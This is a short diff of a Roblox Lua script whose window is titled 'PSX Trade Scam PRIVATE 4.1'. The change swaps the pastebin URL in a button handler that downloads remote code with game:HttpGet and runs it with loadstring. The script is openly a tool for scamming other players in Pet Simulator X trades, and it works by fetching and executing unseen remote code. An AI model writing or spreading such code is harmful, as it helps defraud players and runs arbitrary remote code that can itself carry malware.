@@ -9,6 +9,6 @@ local Window = Library.CreateLib("PSX Trade Scam PRIVATE 4.1", "Midnight")
 
     MainSection:NewButton("Click To Activate", "Made by Sadmc", function()
    
-  loadstring(game:HttpGet('https://pastebin.com/raw/JpKxp0aD'))()
+  loadstring(game:HttpGet('https://pastebin.com/raw/3L2dzrYY'))()
       end)
 
